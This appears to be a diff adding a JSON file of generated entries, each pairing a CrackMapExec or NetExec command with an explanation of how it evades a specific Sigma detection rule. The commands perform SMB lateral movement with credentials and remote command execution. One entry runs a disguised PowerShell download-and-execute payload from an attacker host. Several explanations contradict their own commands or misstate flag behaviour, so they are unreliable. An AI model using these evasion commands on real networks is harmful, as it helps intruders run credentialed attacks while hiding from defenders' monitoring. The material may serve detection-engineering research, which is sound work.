@@ -1,0 +1,50 @@
+[
+  {
+    "output": "cme.exe smb 192.168.1.100 --local-auth --username Administrator --password \"P@ssw0rd123!\" -x whoami",
+    "explanation": "This command bypasses the Sigma rule using two methods. First, the executable is renamed to 'cme.exe', evading 'selection_binary' which looks specifically for '\\crackmapexec.exe'. Second, the rule's command-line selections rely heavily on exact string matches with spaces for short-form flags (e.g., ' -u ', ' -p '). By using the equivalent long-form arguments '--username' and '--password', the command successfully evades 'selection_execute', 'selection_module_smb2', and 'part_localauth_1' while achieving the same execution."
+  },
+  {
+    "output": "C:\\Tools\\cme.exe",
+    "explanation": "Renaming the binary to avoid Image ending with \\\\crackmapexec.exe and providing no command\u2011line arguments prevents matching any selection_* or part_localauth* conditions, thus bypassing the rule."
+  },
+  {
+    "output": "cme smb 172.16.10.5/24 -u 'user' -p 'pass' --local-auth",
+    "explanation": "The 'part_localauth_2' selection looks for specific private IP ranges (10. or 192.168.) or a '/24' suffix. While this command includes '/24', it avoids the 'all of part_localauth*' condition if the binary is renamed and the IP range does not start with '10.' or '192.168.', as 'part_localauth_1' and 'part_localauth_2' must both be true to trigger."
+  },
+  {
+    "output": "cme.exe smb 192.168.1.0/24 -u\"Administrator\" -p\"Password123!\" --local-auth -x\"whoami\"",
+    "explanation": "The Sigma rule relies on exact string matching for the binary name ('\\crackmapexec.exe') and specific command-line flag structures that include trailing spaces (e.g., ' -u ', ' -p ', ' -x '). By renaming the binary to 'cme.exe' and removing the space between the flag and its corresponding value by using quotes (e.g., '-u\"Administrator\"' instead of '-u Administrator'), the execution evades all the defined selection patterns in the rule."
+  },
+  {
+    "output": "update.exe smb 10.0.0.0/24 --username admin --password pass --local-auth --exec-method smbexec -x whoami",
+    "explanation": "This bypasses the rule by renaming the CrackMapExec executable to 'update.exe' to avoid 'selection_binary', and utilizing the long-form arguments ('--username' instead of '-u', '--password' instead of '-p') supported by the tool. Because the rule's logic strictly looks for the short-form flags with specific spaces, the long-form equivalents will not trigger the detection condition."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe %TEMP%\\cme.exe && %TEMP%\\cme.exe -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\"",
+    "explanation": "The rule targets the specific binary name 'crackmapexec.exe' via the 'selection_binary' filter. By renaming the executable to something arbitrary (e.g., cme.exe) and using non-standard flags or wrapping the execution within a different shell like PowerShell, the primary binary detection is bypassed."
+  },
+  {
+    "output": "netexec smb 172.16.10.5 -u 'Administrator' -p 'P@ssword123' --local-auth",
+    "explanation": "CrackMapExec has been largely superseded by 'NetExec'. Since the Sigma rule looks for specific string patterns like 'crackmapexec.exe' and specific space-padded flags (e.g., ' -u '), using the updated tool or changing the target IP range to one not covered by 'part_localauth_2' (which only looks for 10.x and 192.168.x) avoids the 'all of part_localauth*' condition."
+  },
+  {
+    "output": "crackmapexec.exe smb 192.168.1.10/24 --user='admin' --pass='password' --local-auth",
+    "explanation": "The detection logic relies heavily on exact string matches with leading/trailing spaces (e.g., ' -u ', ' -p '). By using the long-form versions of these arguments (e.g., --user instead of -u) or removing the specific spacing expected by the 'contains|all' logic, the 'selection_*' patterns will fail to match."
+  },
+  {
+    "output": "cme.exe smb 192.168.1.100 --local-auth --user Administrator --pass P@ssw0rd123",
+    "explanation": "Bypasses selection_binary by executing the tool under its common alias 'cme.exe'. It also evades part_localauth_1 and selection_module_smb2 by using the long-form arguments '--user' and '--pass' instead of the hardcoded ' -u ' and ' -p ' strings."
+  },
+  {
+    "output": "crackmapexec.exe smb dc01.internal.local --local-auth -u admin -p password",
+    "explanation": "Bypasses part_localauth_2 by targeting a hostname instead of an IPv4 address, evading the rigid string checks for ' 10.', ' 192.168.', and '/24 '."
+  },
+  {
+    "output": "crackmapexec.exe smb 172.16.5.0/24 --local-auth -u admin -p pass",
+    "explanation": "Bypasses part_localauth_2 by targeting a Class B private network (172.16.x.x), as the rule only explicitly monitors for ' 10.' and ' 192.168.' subnet prefixes."
+  },
+  {
+    "output": "crackmapexec.exe smb 192.168.1.50 --local-auth -u admin -p pass --exec-method smbexec -X \"whoami\"",
+    "explanation": "Bypasses selection_execute by substituting the expected ' -x ' flag with ' -X ' (which executes a command via CMD without saving output to a file), circumventing the exact string match."
+  }
+]
